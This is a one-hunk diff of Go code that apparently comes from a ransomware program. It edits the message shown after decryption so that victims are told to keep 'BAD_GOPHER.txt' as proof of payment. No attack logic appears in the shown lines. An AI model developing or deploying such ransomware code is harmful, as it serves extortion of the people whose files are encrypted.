@@ -420,7 +420,7 @@ func deactivate(home string, decryptionKeyPath string) {
 		}
 	}
 
-	fmt.Println("Your files have been restored! Thank you for your cooperation.")
+	fmt.Println("Your files have been restored! Thank you for your cooperation. You may delete the files from your desktop, but save \"BAD_GOPHER.txt\" for proof-of-payment.")
 	fmt.Print("Press 'Enter' to exit...")
 	bufio.NewReader(os.Stdin).ReadBytes('\n')
 }
